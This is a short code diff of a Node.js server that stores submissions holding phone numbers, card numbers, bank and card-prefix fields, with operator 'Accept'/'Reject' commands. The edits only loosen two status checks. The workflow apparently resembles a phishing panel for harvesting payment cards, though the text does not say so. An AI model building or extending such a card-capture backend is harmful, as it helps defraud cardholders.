@@ -103,7 +103,7 @@ const server = http.createServer(async (req, res) => {
         
         // If card data is provided and there's an existing submission for this phone, update it
         if (body.cardNumber && body.phone) {
-            const existing = submissions.find(s => s.phone === body.phone && s.status === 'pending');
+            const existing = submissions.find(s => s.phone === body.phone && (s.status === 'pending' || s.status === 'new'));
             if (existing) {
                 existing.bank = body.bank || existing.bank;
                 existing.cardPrefix = body.cardPrefix || existing.cardPrefix;
@@ -169,7 +169,7 @@ const server = http.createServer(async (req, res) => {
         });
         
         // Update submission status
-        const sub = submissions.find(s => s.pid == peopleId && s.status === 'pending');
+        const sub = submissions.find(s => s.pid == peopleId && !['Accept','Reject'].includes(s.status));
         if (sub) {
             sub.status = command;
         }
